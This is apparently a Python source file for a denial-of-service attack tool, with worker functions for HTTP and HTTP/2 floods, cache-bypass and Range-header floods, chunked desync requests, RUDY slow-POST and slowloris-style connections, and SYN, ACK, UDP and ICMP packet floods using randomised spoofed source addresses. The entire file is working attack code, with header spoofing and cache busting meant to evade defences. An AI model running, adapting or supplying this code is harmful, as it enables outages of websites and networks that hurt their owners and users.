import asyncio, aiohttp, random, time, socket, threading
from worker_utils import *

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
]

RANDOM_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact", "/login", "/search",
    "/products", "/blog", "/news", "/api/v1/status", "/robots.txt",
]

def get_random_ua(): return random.choice(USER_AGENTS)
def get_random_path(): return random.choice(RANDOM_PATHS)

async def http_worker(url, worker_id):
    connector = aiohttp.TCPConnector(limit=0, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while not stop_event.is_set():
            headers = {
                "User-Agent": get_random_ua(),
                "Accept": "*/*",
                "Cache-Control": "no-cache",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
            }
            try:
                async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5) as r:
                    increment('sent')
                    if r.status < 500: increment('success')
                    else: increment('failed')
            except:
                increment('sent'); increment('failed')

async def http2_worker(url, worker_id):
    import httpx
    async with httpx.AsyncClient(http2=True, verify=False, timeout=5.0) as client:
        while not stop_event.is_set():
            headers = {"User-Agent": get_random_ua()}
            try:
                r = await client.get(url.rstrip('/') + get_random_path(), headers=headers)
                increment('sent')
                if r.status_code < 500: increment('success')
                else: increment('failed')
            except:
                increment('sent'); increment('failed')

async def desync_worker(url, worker_id):
    parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
    host = parsed.split(':')[0]
    port = 443 if 'https' in url else 80
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((host, port))
            raw_req = f"GET {get_random_path()} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n"
            sock.send(raw_req.encode())
            sock.close()
            increment('sent'); increment('success')
        except:
            increment('sent'); increment('failed')

async def cache_bypass_worker(url, worker_id):
    connector = aiohttp.TCPConnector(limit=0, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while not stop_event.is_set():
            params = {f"cb_{random.randint(0,9999)}": random.randint(100000, 999999) for _ in range(3)}
            headers = {"User-Agent": get_random_ua(), "Cache-Control": "no-cache"}
            try:
                async with session.get(url.rstrip('/') + get_random_path(), params=params, headers=headers, timeout=5) as r:
                    increment('sent')
                    if r.status < 500: increment('success')
                    else: increment('failed')
            except:
                increment('sent'); increment('failed')

async def range_worker(url, worker_id):
    connector = aiohttp.TCPConnector(limit=0, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        while not stop_event.is_set():
            headers = {"User-Agent": get_random_ua(), "Range": f"bytes={random.randint(0,1024)}-{random.randint(1025,1048576)}"}
            try:
                async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5) as r:
                    increment('sent')
                    if r.status < 500: increment('success')
                    else: increment('failed')
            except:
                increment('sent'); increment('failed')

async def rudy_worker(url, worker_id):
    parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
    host = parsed.split(':')[0]
    port = 443 if 'https' in url else 80
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(120)
            sock.connect((host, port))
            sock.send(f"POST {get_random_path()} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 9999999\r\n\r\n".encode())
            for _ in range(300):
                if stop_event.is_set(): break
                sock.send(random.choices(b"abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(5,15)))
                time.sleep(random.uniform(5, 15))
                increment('sent'); increment('success')
            sock.close()
        except:
            increment('sent'); increment('failed')

async def mixed_worker(url, worker_id):
    while not stop_event.is_set():
        choice = random.randint(1, 10)
        if choice <= 3: await http_worker(url, worker_id)
        elif choice <= 5: await http2_worker(url, worker_id)
        elif choice <= 6: await cache_bypass_worker(url, worker_id)
        elif choice <= 7: await range_worker(url, worker_id)
        elif choice <= 8: await desync_worker(url, worker_id)
        elif choice <= 9: await rudy_worker(url, worker_id)
        else:
            if stop_event.is_set(): break
            try:
                parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
                host = parsed.split(':')[0]
                port = 443 if 'https' in url else 80
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                sock.send(f"GET {get_random_path()} HTTP/1.1\r\nHost: {host}\r\n".encode())
                time.sleep(random.uniform(0.1, 0.5))
                increment('sent'); increment('success')
                sock.close()
            except:
                increment('sent'); increment('failed')

def syn_worker(ip, port):
    from scapy.all import IP, TCP, send
    while not stop_event.is_set():
        src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
        pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")
        send(pkt, verbose=False)
        increment('sent'); increment('success')

def ack_worker(ip, port):
    from scapy.all import IP, TCP, send
    while not stop_event.is_set():
        src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
        pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="A")
        send(pkt, verbose=False)
        increment('sent'); increment('success')

def udp_worker(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        sock.sendto(random._urandom(random.randint(1024, 4096)), (ip, port))
        increment('sent'); increment('success')

def icmp_worker(ip):
    from scapy.all import IP, ICMP, send
    while not stop_event.is_set():
        pkt = IP(dst=ip)/ICMP()/random._urandom(random.randint(64, 1024))
        send(pkt, verbose=False)
        increment('sent'); increment('success')

def run_async_flood(worker_func, url, workers):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = [worker_func(url, i) for i in range(workers)]
    loop.run_until_complete(asyncio.gather(*tasks))
